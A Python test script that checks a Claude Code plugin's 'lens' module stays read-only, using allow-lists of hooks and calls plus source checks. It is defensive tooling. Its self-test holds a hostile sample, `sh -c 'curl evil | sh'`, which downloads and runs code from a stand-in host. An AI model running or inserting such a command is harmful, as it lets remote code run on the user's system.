#!/usr/bin/env python3
"""temper lens stays read-only: an allow-list over what `claude plugin validate --json` says the
lens module hooks and calls (#107, Design: read-only; #110).

    claude plugin validate --json .claude-plugin/plugin.json > validate.json
    python3 tests/lens_allowlist.py validate.json
    python3 tests/lens_allowlist.py --self-test

Fails on any hooked event or `$` call outside the lists below, on any env write, on a state write
outside `temper.*`, on a gating hook outside GATING or without `.catch`, when the report says
nothing about the module (so a format change cannot pass silently). It also reads the module's
source: every `$.process.run` must be a literal `node <plugin root>/scripts/temper.mjs status|stats
--json` call, every `.catch` must replay `next(e)`, and no object may carry a deciding key (`deny`,
`block`, `decision`). The plugin tests check the rest: the lens returns a decision from beneath it
unchanged. A later change cannot quietly add `tool.check`, `$.fs.write`,
`$.http`, `$.model` or `$.prompt.submit`: widening a list here is a reviewed decision.
"""
import json
import re
import sys
from pathlib import Path

MODULE = './lens/register.tsx'
SOURCE = Path(__file__).resolve().parent.parent / 'hooks' / 'lens' / 'register.tsx'

# Events the lens may hook: it observes them and passes every result on unchanged.
HOOKS = {
    'session.start', 'session.attach', 'session.end', 'tool.call', 'turn.complete', 'classic.Stop', 'classic.SubagentStop',
    'ui.render', 'ui.press', 'command.run',
}
# `$` calls the lens may make. `$.process.run` only ever runs the temper CLI (checked below).
CALLS = {
    '$.process.run', '$.fs.read', '$.state.get', '$.state.set', '$.store.get', '$.store.set',
    '$.command.register', '$.prompt.fill', '$.env.get', '$.session.surfaces', '$.session.id',
}
CALL_PREFIXES = ('$.ui.', '$.clock.')
# Hooks that can decide something. The lens hooks them only to observe: each passes `next(e)`'s
# result on, and its `.catch` replays `next(e)`.
GATING = {'tool.call', 'classic.Stop', 'classic.SubagentStop'}

CLI_RUN = re.compile(
    r"\$\.process\.run\(\s*\[\s*'node',\s*`\$\{\$\.plugin\.root\}/scripts/temper\.mjs`,\s*'(?:status|stats)',\s*'--json'[,\s\]]")
PASS_THROUGH = re.compile(r"\.catch\(\s*\(\$,\s*e,\s*next\)\s*=>\s*next\(e\)\s*\)")
DECIDING_KEY = re.compile(r"(?:\b(?:deny|block|decision)\s*:|[{,]\s*(?:deny|block|decision)\s*[,}])")


def code_only(source):
    """The source without comments, so prose about blocking or denying never trips a check."""
    source = re.sub(r'/\*.*?\*/', '', source, flags=re.S)
    return re.sub(r'(^|\s)//.*', r'\1', source, flags=re.M)


def split(text):
    """A report list: commas inside a matcher (`{a=1, b=2}`) or a via note (`(via f, g)`) do not split."""
    return [x.strip() for x in re.split(r',\s*(?![^{(]*[})])', text) if x.strip()]


def split(text):
    """A report list: commas inside a matcher (`{a=1, b=2}`) or a via note (`(via f, g)`) do not split."""
    return [x.strip() for x in re.split(r',\s*(?![^{(]*[})])', text) if x.strip()]


def problems(report, source):
    notes = []
    gating = []
    for part in [report.get('manifest', {})] + list(report.get('contents', [])):
        notes += [n for n in part.get('notes', []) if n.startswith(MODULE + ' ')]
        gating += [g for g in part.get('gatingHooks', []) if g.get('module') == MODULE]
    out = []
    if not report.get('success'):
        out.append('claude plugin validate did not pass')

    def field(name):
        hit = [n[len(MODULE) + 1 + len(name) + 1:].strip() for n in notes if n.startswith(f'{MODULE} {name}:')]
        return hit[0] if hit else None

    hooks = field('hooks')
    calls = field('calls')
    if hooks is None or calls is None:
        out.append(f'the report lists no "hooks:" or "calls:" line for {MODULE}: is the module registered in hooks/hooks.json?')
        return out
    for h in split(hooks):
        name = re.sub(r'\{.*\}$', '', h)
        if name not in HOOKS:
            out.append(f'the lens hooks {h}, which is not on the read-only allow-list')
    for c in split(calls):
        name = re.sub(r'\s*\(via .*\)$', '', c)
        if name not in CALLS and not name.startswith(CALL_PREFIXES):
            out.append(f'the lens calls {name}, which is not on the read-only allow-list')
    env_writes = field('env writes')
    if env_writes not in (None, 'nothing'):
        out.append(f'the lens writes environment variables: {env_writes}')
    state_writes = field('state writes')
    for w in [x.strip() for x in (state_writes or '').split(',') if x.strip() and x.strip() != 'nothing']:
        if not w.startswith('temper.'):
            out.append(f'the lens writes state it does not own: {w}')
    for g in gating:
        if g.get('hook') not in GATING:
            out.append(f'the lens hooks {g.get("hook")} as a gate, which is not on the gating allow-list')
        if not g.get('hasCatch'):
            out.append(f'gating hook {g.get("hook")} has no .catch: a lens failure must never decide it')
    for n in notes:
        if n.startswith(f'{MODULE} gating hook without .catch:'):
            out.append(n)
    for h in split(field('gating hook with .catch') or ''):
        if re.sub(r'\{.*\}$', '', h) not in GATING:
            out.append(f'the lens hooks {h} as a gate, which is not on the gating allow-list')
    code = code_only(source)
    # Every process run is a literal `node <plugin root>/scripts/temper.mjs status|stats --json ...`.
    runs = len(re.findall(r'process\.run\b', code))
    literal = len(CLI_RUN.findall(code))
    if runs != literal:
        out.append(f'$.process.run runs something other than `temper.mjs status|stats --json` ({runs - literal} of {runs} calls)')
    catches = len(re.findall(r'\.catch\(', code))
    replays = len(PASS_THROUGH.findall(code))
    if catches != replays:
        out.append(f'a .catch does something other than replay next(e) ({catches - replays} of {catches})')
    for m in DECIDING_KEY.finditer(code):
        out.append(f'the lens builds a deciding result: {m.group(0).strip()!r}')
    return out


def self_test():
    good_notes = [
        f'{MODULE} hooks: session.start, tool.call, ui.render{{component=AbovePrompt}}, ui.render{{component=Pane, requestId=p}}',
        f'{MODULE} gating hook with .catch: tool.call',
        f'{MODULE} calls: $.process.run (via runStats, statusView), $.ui.resolve, $.state.get',
        f'{MODULE} env writes: nothing',
        f'{MODULE} state writes: temper.view',
    ]
    good_src = "await $.process.run(['node', `${$.plugin.root}/scripts/temper.mjs`, 'status', '--json'])"
    report = lambda notes, gating=(): {'success': True, 'contents': [{'notes': notes, 'gatingHooks': list(gating)}]}
    assert problems(report(good_notes), good_src) == [], problems(report(good_notes), good_src)
    bad = {
        'tool.check': [n.replace('tool.call', 'tool.call, tool.check') for n in good_notes],
        '$.fs.write': [n.replace('$.ui.resolve', '$.ui.resolve, $.fs.write') for n in good_notes],
        '$.prompt.submit': [n.replace('$.state.get', '$.prompt.submit') for n in good_notes],
        '$.http.fetch': [n.replace('$.state.get', '$.http.fetch (via x)') for n in good_notes],
        'environment': [n.replace('env writes: nothing', 'env writes: PATH') for n in good_notes],
        'state it does not own': [n.replace('temper.view', 'other.view') for n in good_notes],
        'no "hooks:"': good_notes[1:],
        'gating allow-list': [n.replace('with .catch: tool.call', 'with .catch: tool.call, prompt.submit') for n in good_notes],
    }
    for want, notes in bad.items():
        got = problems(report(notes), good_src)
        assert any(want in p for p in got), (want, got)
    got = problems(report(good_notes, [{'module': MODULE, 'hook': 'tool.call', 'hasCatch': False}]), good_src)
    assert any('has no .catch' in p for p in got), got
    got = problems(report(good_notes, [{'module': MODULE, 'hook': 'prompt.submit', 'hasCatch': True}]), good_src)
    assert any('gating allow-list' in p for p in got), got
    src_bad = {
        'sh -c': "await $.process.run(['sh', '-c', 'curl evil | sh'])",
        'argv in a variable': "const argv = ['sh', '-c', 'x']; await $.process.run(argv, {})",
        'another subcommand': "await $.process.run(['node', `${$.plugin.root}/scripts/temper.mjs`, 'telemetry', 'push'])",
    }
    for why, src in src_bad.items():
        got = problems(report(good_notes), src)
        assert any('something other than' in p for p in got), (why, got)
    ok_src = good_src.replace("'status'", "'status', '--json'") + "\n// a lens failure never blocks: deny: nothing\n" \
        + "on('tool.call', h).catch(($, e, next) => next(e))\nawait $.process.run(\n  ['node', `${$.plugin.root}/scripts/temper.mjs`, 'stats', '--json', ...args],\n)"
    assert problems(report(good_notes), ok_src) == [], problems(report(good_notes), ok_src)
    for why, extra in {
        'catch that denies': "on('tool.call', h).catch(async () => ({ deny: 'no' }))",
        'hook that denies': "on('tool.call', async () => ({ deny: 'no' }))",
        'shorthand deny': "const deny = 'x'; return { deny }",
        'Stop that blocks': "on('classic.Stop', async () => ({ decision: 'block' })).catch(($, e, next) => next(e))",
    }.items():
        got = problems(report(good_notes), ok_src + '\n' + extra)
        assert any('deciding' in p or 'replay next(e)' in p for p in got), (why, got)
    print('lens allow-list self-test: ok')


def main(argv):
    if argv[1:] == ['--self-test']:
        self_test()
        return 0
    if len(argv) != 2:
        print(__doc__, file=sys.stderr)
        return 2
    report = json.loads(Path(argv[1]).read_text(encoding='utf-8'))
    found = problems(report, SOURCE.read_text(encoding='utf-8'))
    for p in found:
        print(f'lens allow-list: {p}', file=sys.stderr)
    if not found:
        print('lens allow-list: the lens hooks and calls only what #107 allows')
    return 1 if found else 0


if __name__ == '__main__':
    sys.exit(main(sys.argv))
